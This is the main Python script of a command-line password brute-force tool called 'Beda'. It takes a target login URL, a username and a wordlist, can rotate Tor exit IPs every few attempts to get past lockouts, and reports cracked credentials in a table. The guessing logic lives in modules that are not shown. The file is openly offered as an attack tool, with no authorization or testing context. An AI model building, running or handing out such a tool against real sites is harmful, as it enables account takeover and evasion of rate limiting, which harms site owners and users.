#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.realpath(__file__)))

import argparse
import time
from rich.console import Console
from rich.table import Table
from rich import box

from banner import show_banner
from brute import run_brute
from tor_manager import start_tor

console = Console()

# ─── Argument Parser ──────────────────────────────────────────
parser = argparse.ArgumentParser(
    prog="beda",
    description="Beda — Advanced HTTPS Brute Force Tool",
    epilog="Example: beda -t https://site.com/login -u admin -w rockyou.txt"
)

parser.add_argument("-v",  "--version",     action="version", version="Beda v1.0.0")
parser.add_argument("-t",  "--target",      required=True,  help="Target login URL")
parser.add_argument("-u",  "--username",    required=True,  help="Username to brute force")
parser.add_argument("-w",  "--wordlist",    required=True,  help="Password wordlist")
parser.add_argument("-x",  "--verbose",     action="store_true", help="Show all attempts")
parser.add_argument("--user-field",         help="Override username field name")
parser.add_argument("--pass-field",         help="Override password field name")
parser.add_argument("--success-text",       help="Text that appears on successful login")
parser.add_argument("--fail-text",          help="Text that appears on failed login")
parser.add_argument("--tor",                action="store_true", help="Route through Tor")
parser.add_argument("--rotate-every",       type=int, default=2, help="Rotate IP every N attempts (default: 2)")
parser.add_argument("--delay",              type=float, default=0, help="Delay between attempts in seconds")
parser.add_argument("--timeout",            type=int, default=5, help="Request timeout")
parser.add_argument("--header",             action="append", help="Extra header (e.g. 'X-Custom: value')")
parser.add_argument("--data",               action="append", help="Extra POST data (e.g. 'key=value')")

args = parser.parse_args()

# ─── Banner ───────────────────────────────────────────────────
show_banner()

# ─── Parse extra headers ─────────────────────────────────────
extra_headers = {}
if args.header:
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

# ─── Parse extra data ────────────────────────────────────────
extra_data = {}
if args.data:
    for d in args.data:
        if "=" in d:
            k, v = d.split("=", 1)
            extra_data[k.strip()] = v.strip()

# ─── Tor setup ───────────────────────────────────────────────
if args.tor:
    console.print("  [cyan][BEDA] Initializing Tor...[/cyan]")
    start_tor()

# ─── Info ─────────────────────────────────────────────────────
console.print(f"  [bold red]Target    : {args.target}[/bold red]")
console.print(f"  [bold red]Username  : {args.username}[/bold red]")
console.print(f"  [bold red]Wordlist  : {args.wordlist}[/bold red]")
console.print(f"  [bold red]Tor       : {'ON 🧅' if args.tor else 'OFF'}[/bold red]")
console.print(f"  [bold red]Verbose   : {'ON 🔍' if args.verbose else 'OFF'}[/bold red]")
if args.tor:
    console.print(f"  [bold red]Rotate IP : every {args.rotate_every} attempts[/bold red]")
if args.delay:
    console.print(f"  [bold red]Delay     : {args.delay}s[/bold red]")

console.print(f"\n  [yellow][BEDA] Starting attack...[/yellow]\n")

start = time.time()

# ─── Run ──────────────────────────────────────────────────────
result = run_brute(
    url=args.target,
    username=args.username,
    wordlist=args.wordlist,
    user_field=args.user_field,
    pass_field=args.pass_field,
    success_text=args.success_text,
    fail_text=args.fail_text,
    rotate_every=args.rotate_every,
    use_tor=args.tor,
    delay=args.delay,
    timeout=args.timeout,
    verbose=args.verbose,
    extra_headers=extra_headers if extra_headers else None,
    extra_data=extra_data if extra_data else None,
)

elapsed = round(time.time() - start, 2)

# ─── Report ───────────────────────────────────────────────────
if result:
    table = Table(
        title="🔓 Credentials Found!",
        box=box.DOUBLE_EDGE,
        style="green",
        title_style="bold green",
        show_lines=True
    )
    table.add_column("Property", style="bold white", width=15)
    table.add_column("Value",    style="bold red",   width=40)

    table.add_row("Target",    args.target)
    table.add_row("Username",  result["username"])
    table.add_row("Password",  result["password"])
    table.add_row("Attempts",  str(result["attempts"]))
    table.add_row("Time",      f"{result['time']}s")
    table.add_row("Final URL", result.get("url", "-"))

    console.print()
    console.print(table)
else:
    console.print(f"\n  [red]❌ No credentials found. ({elapsed}s)[/red]\n")
